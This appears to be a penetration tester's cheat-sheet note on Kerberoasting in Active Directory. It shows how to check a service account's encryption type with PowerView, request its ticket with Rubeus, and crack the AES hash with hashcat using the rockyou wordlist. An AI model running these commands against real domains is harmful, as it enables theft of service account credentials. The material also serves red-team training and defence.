# Kerberos: Determine Encryption

OS: Active_Directory
Description: Kerberos: Determine Encryption
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### Given a user ‘testspn’, we can check for the encryption type used when issuing TGS-REQ

![Untitled](Kerberos%20Determine%20Encryption/Untitled.png)

```jsx
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

- If the number is something other than 0
    - Checking with PowerView, we can see that the `msDS-SupportedEncryptionTypes` attribute is set to `0`. The chart [here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of `0` means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.
- Given AES encryption we might see:

![Untitled](Kerberos%20Determine%20Encryption/Untitled%201.png)

```jsx
 .\Rubeus.exe kerberoast /user:testspn /nowrap
 (This will show AES is used)
```

- Hashcat mode changes

```jsx
**hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt** 
```